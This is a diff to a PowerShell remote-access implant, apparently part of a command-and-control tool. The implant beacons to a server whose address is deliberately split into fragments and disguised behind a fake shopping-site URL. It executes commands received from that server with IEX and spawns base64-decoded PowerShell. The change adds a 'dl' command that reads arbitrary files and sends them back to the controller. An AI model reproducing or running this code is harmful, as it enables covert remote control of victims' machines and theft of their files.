@@ -1,5 +1,5 @@
 $h0 = "192.168"
-$me = ".12.27"
+$me = ".0.189"
 $p0rt= "8080"
 $uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 $proto = "ht"+"tp"+":/"+"/"
@@ -53,33 +53,49 @@ function ConvertTo-Hashtable {
 while ($True) {
 	$serverMsg = (Invoke-WebRequest -Method Post -Uri $h0me -Body $checkin -UserAgent $useragent -UseBasicParsing).Content
 	$jsondata = "{" + $serverMsg.split("{")[1].split("`n")[0]
-  $jsObject = $jsondata | ConvertFrom-Json | ConvertTo-Hashtable
+	$jsObject = $jsondata | ConvertFrom-Json | ConvertTo-Hashtable
 
 	if($jsObject['cmnd']) {
+		$rettype = "retval" #Default
+		$binary = $false
+	
 		if($jsObject['cmnd'] -eq "quit") {
 			exit
 		}
 
-    if($jsObject['cmnd'].split(" ")[0] -eq "spawn") {
-		 try {
-        $selfdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
-			  $selfdata = $selfdata.replace('"','"""')
-			  Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
+		if($jsObject['cmnd'].split(" ")[0] -eq "spawn") {
+			try {
+				$selfdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
+				$selfdata = $selfdata.replace('"','"""')
+				Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
 				$retval = "[+] Spawn success..."
-      }
+			}
 			catch {
 				$retval = "[-] Spawn failed..."
 			}
 		}
 
-    elseif($jsObject['cmnd'].split(" ")[0] -eq "psh") {
-      $psdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
+		elseif($jsObject['cmnd'].split(" ")[0] -eq "psh") {
+			$psdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
 			$retval = IEX $psdata -ErrorVariable err 2>&1
 			if($err) {
 				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
 				$err = ""
 			}
-    }
+		}
+		
+		elseif($jsObject['cmnd'].split(" ")[0] -eq "dl") {
+			$filepath = $jsObject['cmnd'].split(" ")[1..99] -join " "
+			if(Test-Path $filepath) {
+				$filepath = Resolve-Path $filepath
+				$retval = [System.IO.File]::ReadAllBytes($filepath)
+				$rettype = "dl"
+				$binary = $true
+			}
+			else {
+				$retval = "[!] Could not read file: $filepath"
+			}
+		}
 
 		else {
 			$retval = IEX $jsObject['cmnd'] -ErrorVariable err 2>&1
@@ -93,10 +109,17 @@ while ($True) {
 			$retval = "[*] No output returned"
 		}
 
-    $jsObject.cmnd = ""
-		$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($retval | Out-String)))
-		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"retval`": `"$ncoded`"}"
+		
+		if($binary) { #Binary data
+			$ncoded = [Convert]::ToBase64String($retval)
+		}
+		else { # String data
+			$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($retval | Out-String)))
+		}
+		$jsObject.cmnd = ""
+		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"$rettype`": `"$ncoded`"}"
 		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
 	}
 	Start-Sleep -Milliseconds $sleepytime
 }
+
